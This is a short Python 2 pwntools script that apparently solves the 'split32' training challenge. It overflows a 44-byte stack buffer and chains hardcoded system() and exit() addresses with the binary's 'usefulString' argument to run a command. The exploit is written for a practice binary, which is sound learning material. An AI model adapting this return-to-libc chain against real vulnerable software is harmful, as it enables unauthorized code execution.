#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')

def pwn():

    e = ELF("./split32")

    ''' Create buffer '''
    buf = "A" * 44

    system_addr = p32(0xf7df8f80)
    arg_addr = p32(e.symbols["usefulString"])
    exit_addr = p32(0xf7debf10)
    io = e.process()
    io.sendline(buf + system_addr + exit_addr + arg_addr)
    print(io.recvall())

if __name__ == '__main__':
    pwn()
